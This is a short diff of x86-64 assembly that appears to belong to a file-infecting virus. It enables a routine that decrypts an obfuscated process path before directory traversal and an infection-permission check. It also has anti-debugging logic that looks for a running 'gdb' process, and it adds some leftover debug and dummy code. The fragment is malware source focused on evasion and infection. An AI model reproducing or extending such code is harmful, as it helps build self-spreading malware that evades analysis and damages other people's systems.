@@ -15,11 +15,12 @@ _start:
 	call _map_int_table
 	call _check_debug
 
-	; lea rdi, [rel procPath]
-	; mov rsi, procPathLen
-	; call _decrypt_str
-	; mov rdi, rax
-	; call _initDir
+	lea rdi, [rel procPath]
+	mov rsi, procPathLen
+	call _decrypt_str
+	mov rdi, rax
+    mov rdx, 0
+	call _initDir
 
     call _isInfectionAllow
     test rax, rax
@@ -342,6 +343,15 @@ _check_proc:
 	test rax, rax
 	jz _next
 
+	; push rdi
+	; mov rax, SYS_WRITE
+	; mov rdi, 0x1
+	; mov rsi, rsp
+	; mov rdx, 0x4
+	; syscall
+	; pop rdi
+	; _br_write:
+
 	mov rax, SYS_CLOSE
 	syscall 
 
@@ -351,7 +361,11 @@ _check_proc:
 	_cmpgdb:
 	cmp ebx, 0x0A626467
 	je _final_jmp
+	; je oui
 	jmp _next
+
+	oui:
+		jmp _next
 
 _check_file:
 	push rbp
